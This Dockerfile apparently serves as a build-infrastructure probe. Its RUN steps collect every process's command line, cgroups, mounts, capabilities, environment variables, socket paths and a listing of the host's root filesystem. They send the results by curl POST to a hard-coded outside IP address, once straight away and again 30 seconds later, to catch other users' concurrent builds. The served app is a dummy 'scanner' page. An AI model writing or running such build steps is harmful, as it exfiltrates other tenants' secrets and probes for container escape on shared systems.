FROM node:20-slim
RUN apt-get update -qq && apt-get install -y -qq curl procps 2>/dev/null

# RACE CONDITION PROBES - look for other builds on this worker
RUN (echo "=== PS ===" && ps auxww 2>&1 && echo "=== CMDLINE ===" && for p in /proc/[0-9]*/cmdline; do echo -n "$p: "; cat "$p" 2>/dev/null | tr '\0' ' '; echo; done && echo "=== CGROUP ===" && cat /proc/self/cgroup 2>&1 && echo "=== MOUNTS ===" && mount 2>&1 | head -30 && echo "=== CAPS ===" && cat /proc/self/status | grep -E 'Cap|Seccomp' 2>&1 && echo "=== HOSTNAME ===" && hostname && echo "=== OTEL ===" && env | grep OTEL && echo "=== SOCKETS ===" && find / -name "*.sock" 2>/dev/null | head -10 && echo "=== HOST_PROC ===" && ls /proc/1/root/ 2>&1 | head -10) | curl -s -X POST -d @- http://217.25.92.217:8080/RACE-SCAN-FULL || true

# Second scan 30s later (more chance to catch concurrent build)
RUN sleep 30 && (echo "=== PS_DELAYED ===" && ps auxww 2>&1 && echo "=== CMDLINE_DELAYED ===" && for p in /proc/[0-9]*/cmdline; do echo -n "$p: "; cat "$p" 2>/dev/null | tr '\0' ' '; echo; done) | curl -s -X POST -d @- http://217.25.92.217:8080/RACE-SCAN-DELAYED || true

WORKDIR /app
COPY . .
CMD ["node", "-e", "require('http').createServer((q,r)=>r.end('scanner')).listen(3000)"]
